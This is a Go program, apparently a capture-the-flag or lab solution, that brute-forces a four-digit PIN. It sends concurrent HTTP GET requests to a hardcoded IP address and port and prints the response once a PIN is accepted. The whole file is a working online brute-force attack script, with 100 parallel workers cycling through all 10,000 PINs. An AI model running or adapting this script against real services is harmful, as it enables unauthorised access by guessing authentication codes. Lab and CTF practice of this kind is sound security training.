package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
)

const (
	ip         = "83.136.254.158"
	port       = "52976"
	maxWorkers = 100 // Number of concurrent goroutines
)

var (
	found      bool
	foundMutex sync.Mutex
)

func main() {
	pinChannel := make(chan string, maxWorkers)
	var wg sync.WaitGroup

	// Start worker goroutines
	startWorkers(&wg, pinChannel)

	// Generate and send PINs
	generatePins(pinChannel)

	// Wait for all workers to finish
	wg.Wait()
}

// startWorkers starts a fixed number of goroutines to process PINs
func startWorkers(wg *sync.WaitGroup, pinChannel chan string) {
	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for pin := range pinChannel {
				if tryPin(pin) {
					return
				}
			}
		}()
	}
}

// tryPin sends an HTTP GET request to test a specific PIN
func tryPin(pin string) bool {
	// Check if the correct PIN has already been found
	foundMutex.Lock()
	if found {
		foundMutex.Unlock()
		return true
	}
	foundMutex.Unlock()

	url := fmt.Sprintf("http://%s:%s/pin?pin=%s", ip, port, pin)
	req, err := http.Get(url)
	if err != nil {
		log.Printf("Error trying PIN %s: %v", pin, err)
		return false
	}
	defer req.Body.Close()

	log.Printf("Pin tried: %s", pin)

	if req.StatusCode == http.StatusOK {
		foundMutex.Lock()
		if !found {
			found = true
			log.Printf("Correct PIN found: %s", pin)
			body, err := io.ReadAll(req.Body)
			if err != nil {
				log.Printf("Failed to read response body: %v", err)
			} else {
				fmt.Println("Request Body:", string(body))
			}
		}
		foundMutex.Unlock()
		return true
	}
	return false
}

// generatePins sends all possible 4-digit PINs to the pinChannel
func generatePins(pinChannel chan string) {
	for i := 9999; i >= 0; i-- {
		pin := fmt.Sprintf("%04d", i)

		foundMutex.Lock()
		if found {
			foundMutex.Unlock()
			break
		}
		foundMutex.Unlock()

		pinChannel <- pin
	}
	close(pinChannel)
}
